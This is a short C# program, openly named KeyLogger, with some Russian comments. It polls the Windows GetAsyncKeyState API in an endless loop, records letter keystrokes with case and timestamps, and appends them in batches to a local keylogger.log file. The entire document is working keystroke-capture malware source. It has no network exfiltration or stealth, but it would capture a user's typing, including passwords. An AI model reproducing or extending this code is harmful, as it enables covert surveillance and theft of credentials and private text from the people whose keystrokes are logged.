using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Diagnostics;

namespace KeyLogger
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            StartLogging();

        }
        static void StartLogging()
        {
            List<string> bufList = new List<string>();
            while (true)
            {
                // Еще более усовершенствованная проверка //
                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                // Keys.ShiftKey не работает, поэтому я подставил его числовой эквивалент
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool isBig = shift | caps;

                Thread.Sleep(100);
                DateTime dt = DateTime.Now;
                for (int i = 0; i < 255; i++)
                {
                    string buf = "";
                    int state = GetAsyncKeyState(i);
                    if (state != 0) //if(state == 1 || state == -32767) //
                    {
                        if (((Keys)i) == Keys.Space) { buf = ""; continue; }
                        if (((Keys)i) == Keys.Enter) { buf = ""; continue; }
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += "\r\n";
                            if(isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                            
                            buf += "; ";
                            buf += dt.ToString();
                            buf += "." + dt.Millisecond.ToString();
                            bufList.Add(buf);
                        }

                        if (bufList.Count == 10)
                        {
                            foreach(string buff in bufList) File.AppendAllText("keylogger.log", buff);
                            bufList.Clear();
                            //buf = "";
                        }
                    }
                }
            }
        }
    }
}
